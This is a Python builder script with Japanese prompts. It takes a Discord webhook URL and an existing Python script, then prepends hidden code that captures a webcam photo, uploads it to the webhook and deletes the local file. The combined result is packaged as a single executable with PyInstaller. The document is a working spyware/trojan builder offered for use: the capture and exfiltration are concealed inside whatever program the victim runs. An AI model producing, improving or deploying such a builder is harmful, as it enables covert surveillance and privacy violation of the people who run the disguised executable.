import os
import json

def main():
    webhook_url = input("Discord Webhook URLを入力してください: ")
    selected_script_path = input("組み込むPythonスクリプトのパスを入力してください: ")

    photo_script = """
# -*- coding: utf-8 -*-
import cv2
import requests
import os
import json

def take_photo():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error 1")
        return None
    ret, frame = cap.read()
    if not ret:
        print("Error 2")
        return None
    photo_path = "photo.jpg"
    cv2.imwrite(photo_path, frame)
    cap.release()
    return photo_path

def send_photo(webhook_url, photo_path):
    with open(photo_path, 'rb') as f:
        files = {{'file': (photo_path, f)}}
        embeds = [
            {{
                "title": "Photo Upload",
                "description": "A photo has been uploaded.",
                "color": 5814783,
                "footer": {{
                    "text": "Created By Syo: https://github.com/syo33331"
                }}
            }}
        ]
        data = {{
            "username": "Webhook",
            "embeds": embeds
        }}
        headers = {{'Content-Type': 'application/json'}}
        response = requests.post(webhook_url, headers=headers, data=json.dumps(data), files=files)
    if response.status_code == 204:
        os.remove(photo_path)

webhook_url = "{webhook_url}"
photo_path = take_photo()
if photo_path:
    send_photo(webhook_url, photo_path)
""".format(webhook_url=webhook_url.replace('"', '\\"'))

    with open(selected_script_path, 'r', encoding='utf-8') as file:
        user_script = file.read()

    with open('created.py', 'w', encoding='utf-8') as file:
        file.write(photo_script + '\\n' + user_script)

    os.system('pyinstaller --onefile created.py')

if __name__ == '__main__':
    main()
